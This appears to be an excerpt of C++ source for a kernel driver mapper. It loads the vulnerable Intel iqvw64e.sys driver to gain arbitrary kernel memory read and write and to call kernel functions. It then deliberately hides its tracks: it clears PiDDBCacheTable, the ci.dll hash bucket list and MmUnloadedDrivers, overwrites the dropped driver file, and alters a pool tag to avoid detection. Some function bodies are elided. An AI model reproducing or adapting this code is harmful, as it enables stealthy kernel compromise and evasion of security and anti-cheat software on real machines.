...
std::wstring intel_driver::GetDriverPath() {
	...
	return temp + _(L"\\") + GetDriverNameW();
}

bool intel_driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(_(L"\\\\.\\Nal"), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
...
HANDLE intel_driver::Load() {
	...
	if (intel_driver::IsRunning()) {
		printf(_("[-] \\Device\\Nal is already in use.\n"));
	...
	printf(_("[<] Loading vulnerable driver, Name: %s\n"), intel_driver::driver_name);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		printf(_("[-] Can't find TEMP folder\n"));
		return INVALID_HANDLE_VALUE;
	}
	...
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		printf(_("[-] Failed to create vulnerable driver file\n"));
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		printf(_("[-] Failed to register and start service for the vulnerable driver\n"));
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileW(_(L"\\\\.\\Nal"), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!result || result == INVALID_HANDLE_VALUE)
	{
		printf(_("[-] Failed to load driver iqvw64e.sys\n"));
	...
	if (ntoskrnlAddr == 0) {
		printf(_("[-] Failed to get ntoskrnl.exe\n"));
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		printf(_("[-] Failed to ClearPiDDBCacheTable\n"));
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		printf(_("[-] Failed to ClearKernelHashBucketList\n"));
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		printf(_("[!] Failed to ClearMmUnloadedDrivers\n"));
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
...
bool intel_driver::Unload(HANDLE device_handle) {
	printf(_("[<] Unloading vulnerable driver\n"));
	...
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		printf(_("[!] Error dumping shit inside the disk\n"));
	}
	else {
		printf(_("[+] Vul driver data destroyed before unlink\n"));
	}
	file_ofstream.close();
	delete[] randomData;
...
bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	...
	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		printf(_("[-] Failed to translate virtual address -> %p\n"), reinterpret_cast<void*>(address));
		return false;
	}
	...
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		printf(_("[!] Failed to unmap IO space of physical address -> %p\n"), reinterpret_cast<void*>(physical_address));
#endif
...
uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	...
	{
		printf(_("[!] Failed to find MmAlocatePagesForMdl\n"));
		return 0;
	}
...
uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	...
	{
		printf(_("[!] Failed to find MmMapLockedPagesSpecifyCache\n"));
		return 0;
	}
...
bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	...
	{
		printf(_("[!] Failed to find MmProtectMdlSystemAddress\n"));
		return 0;
	}
...
bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	...
	{
		printf(_("[!] Failed to find MmUnmapLockedPages\n"));
		return 0;
	}
...
bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	...
	{
		printf(_("[!] Failed to find MmFreePagesFromMdl\n"));
		return 0;
	}
...
uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	...
	if (!kernel_ExAllocatePool) {
		printf(_("[!] Failed to find ExAllocatePool\n"));
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'ibfe')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
		return 0;
...
bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
	...
	if (!kernel_ExFreePool) {
		printf(_("[!] Failed to find ExFreePool\n"));
		return 0;
	}
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	...
	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		printf(_("[!] Failed to find device_object\n"));
		return false;
	}
	...
	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		printf(_("[!] Failed to find driver_object\n"));
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		printf(_("[!] Failed to find driver_section\n"));
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		printf(_("[!] Failed to find driver name\n"));
		return false;
	}
	...
	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length)) {
		printf(_("[!] Failed to read driver name\n"));
		return false;
	}
	...
	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		printf(_("[!] Failed to write driver name length\n"));
		return false;
	}

	std::wstring wdriver_string(unloadedName);
	std::string driver_string(wdriver_string.begin(), wdriver_string.end());
	printf(_("[+] MmUnloadedDrivers Cleaned: %s\n"), driver_string.c_str());
	delete[] unloadedName;
...
bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	...
	if (!kernel_ExAcquireResourceExclusiveLite) {
		printf(_("[!] Failed to find ExAcquireResourceExclusiveLite\n"));
		return 0;
	}
...
bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	...
	if (!kernel_ExReleaseResourceLite) {
		printf(_("[!] Failed to find ExReleaseResourceLite\n"));
		return false;
	}
...
BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		printf(_("[!] Failed to find RtlDeleteElementGenericTableAvl\n"));
		return false;
	}
...
PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		printf(_("[!] Failed to find RtlLookupElementGenericTableAvl\n"));
		return nullptr;
	}
...
bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
	...
	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)_("PAGE"), intel_driver::ntoskrnlAddr, (PUCHAR)_("\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24"), (char*)_("xxxxxx????xxxxx????xxx????xxxxx????x????xx?x")); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)_("PAGE"), intel_driver::ntoskrnlAddr, (PUCHAR)_("\x66\x03\xD2\x48\x8D\x0D"), (char*)_("xxxxxx")); // 66 03 D2 48 8D 0D
	...
	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)_("PAGE"), intel_driver::ntoskrnlAddr, (PUCHAR)_("\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8"), (char*)_("xxx????xxxxx????xxx????x????x")); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if (PiDDBLockPtr == NULL) {
			printf(_("[-] Warning PiDDBLock not found\n"));
			return false;
		}
		printf(_("[+] PiDDBLock found with second pattern\n"));
	...
	if (PiDDBCacheTablePtr == NULL) {
		printf(_("[-] Warning PiDDBCacheTable not found\n"));
		return false;
	}

	printf(_("[+] PiDDBLock Ptr -> %p\n"), PiDDBLockPtr);
	printf(_("[+] PiDDBCacheTable Ptr -> %p\n"), PiDDBCacheTablePtr);
	...
	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		printf(_("[-] Can't lock PiDDBCacheTable\n"));
		return false;
	}
	printf(_("[+] PiDDBLock Locked\n"));
	...
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		printf(_("[-] Can't delete from PiDDBCacheTable\n"));
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	...
	printf(_("[+] PiDDBCacheTable Cleaned\n"));
...
uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
	if (!dwAddress) {
		printf(_("[-] No module address to find pattern\n"));
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		printf(_("[-] Can't find pattern, Too big section\n"));
		return 0;
	}

	BYTE* sectionData = new BYTE[dwLen];
	if (!ReadMemory(device_handle, dwAddress, sectionData, dwLen)) {
		printf(_("[-] Read failed in FindPatternAtKernel\n"));
		return 0;
	}
...
bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	uint64_t ci = utils::GetKernelModuleAddress(_("ci.dll"));
	if (!ci) {
		printf(_("[-] Can't Find ci.dll module address\n"));
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel(device_handle, (char*)_("PAGE"), ci, PUCHAR(_("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00")), (char*)_("xxx????x?xxxxxxx"));
	if (!sig) {
		printf(_("[-] Can't Find g_KernelHashBucketList\n"));
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR(_("\x48\x8D\x0D")), (char*)_("xxx"));
	if (!sig2) {
		printf(_("[-] Can't Find g_HashCacheLock\n"));
		return false;
	}
	...
	{
		printf(_("[-] Can't Find g_HashCache relative address\n"));
		return false;
	}

	printf(_("[+] g_KernelHashBucketList Found -> %p\n"), g_KernelHashBucketList);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		printf(_("[-] Can't lock g_HashCacheLock\n"), g_HashCacheLock);
		return false;
	}
	printf(_("[+] g_HashCacheLock Locked\n"));
	...
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		printf(_("[-] Failed to read first g_KernelHashBucketList entry!\n"));
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
		}
		return false;
	}
	if (!entry) {
		printf(_("[!] g_KernelHashBucketList looks empty!\n"));
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
		}
		return true;
	...
	while (entry) {
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			printf(_("[-] Failed to read g_KernelHashBucketList entry text len!\n"));
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
			}
			return false;
		...
		if (expected_len == wsNameLen) {
			...
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				printf(_("[-] Failed to read g_KernelHashBucketList entry text ptr!\n"));
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
				}
				return false;
			...
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen)) {
				printf(_("[-] Failed to read g_KernelHashBucketList entry text!\n"));
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
				}
				return false;
			...
			if (find_result != std::wstring::npos) {
				...
				std::wstring wbucket_string(&wsName[find_result]);
				std::string bucket_string(wbucket_string.begin(), wbucket_string.end());
				printf(_("[+] Found In g_KernelHashBucketList: %s\n"), bucket_string.c_str());
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					printf(_("[-] Failed to read g_KernelHashBucketList next entry ptr!\n"));
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
					}
					return false;
				...
				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					printf(_("[-] Failed to write g_KernelHashBucketList prev entry ptr!\n"));
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
					}
					return false;
				...
				if (!FreePool(device_handle, (uintptr_t)entry)) {
					printf(_("[-] Failed to clear g_KernelHashBucketList entry pool!\n"));
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
					}
					return false;
				}
				printf(_("[+] g_KernelHashBucketList Cleaned\n"));
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			printf(_("[-] Failed to read g_KernelHashBucketList next entry!\n"));
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				printf(_("[-] Failed to release g_KernelHashBucketList lock!\n"));
			}
			return false;
